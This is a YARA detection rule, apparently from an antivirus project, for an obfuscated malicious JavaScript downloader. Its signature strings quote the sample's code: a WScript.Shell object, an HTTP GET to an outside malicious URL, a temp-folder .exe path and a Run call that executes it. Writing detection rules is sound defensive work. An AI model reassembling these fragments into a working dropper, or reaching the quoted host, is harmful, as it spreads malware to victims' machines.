rule sig_20160328_07fad3a315b7b2ff8285592a8ff6a4fa {
  meta:
    description = "datamaliciousorder - file 20160328_07fad3a315b7b2ff8285592a8ff6a4fa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d891bf52d6abf639cd27d8391a5604879ff52fbb1e70c7393d1321d7476047cc"

  strings:
    $s1  = "function Eoovttb() {return Akhdx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"TJ1gRpVpkwB9pG.exe\";};" fullword ascii
    $s2  = "Sqpmsld[Mwzsrg](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Hkhkji](Zemizfver() * 11)} while (Sqpmsld[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Kyygifqjjo(Knkkf, Zxoxr){return Knkkf - Zxoxr;};" fullword ascii
    $s5  = "var Akhdx = function Cqnigvm() {return WScript[Itjggtbbvd](\"WScript.Shell\");}();" fullword ascii
    $s6  = " while (Sgznspypn){" fullword ascii
    $s7  = "function Dnooecn() {return ((Qlhbfhttu == true) && (Qlhbfhttu == Rsbjrougdv)) ? 1 : Blfpinw;};" fullword ascii
    $s8  = "function Sdjrgdvzx(Auecslvhp){Akhdx[\"Run\"](Auecslvhp, Blfpinw, Blfpinw);};" fullword ascii
    $s9  = "} catch(Oifrbxm){Sgznspypn = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s10 = "var Qlhbfhttu = false;" fullword ascii
    $s11 = "var Rsbjrougdv = false;" fullword ascii
    $s12 = "function Zemizfver(){return 22;};" fullword ascii
    $s13 = "Rsbjrougdv = true; " fullword ascii
    $s14 = "var Umkftwhpck = new this[\"Date\"]();" fullword ascii
    $s15 = "Qlhbfhttu = true; " fullword ascii
    $s16 = "function Yrgisngjox(){return Itjggtbbvd;};" fullword ascii
    $s17 = "var Jiacpso = false;" fullword ascii
    $s18 = "return Kyygifqjjo(Mbwrsrge, Phxktjo);" fullword ascii
    $s19 = "function Qdfmklh(){return Jvlrtak;};" fullword ascii
    $s20 = "function Bopfa(Eejci) {var Zqmoyjdwwg = (1, 2, 3, 4, 5, Eejci); return Zqmoyjdwwg;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}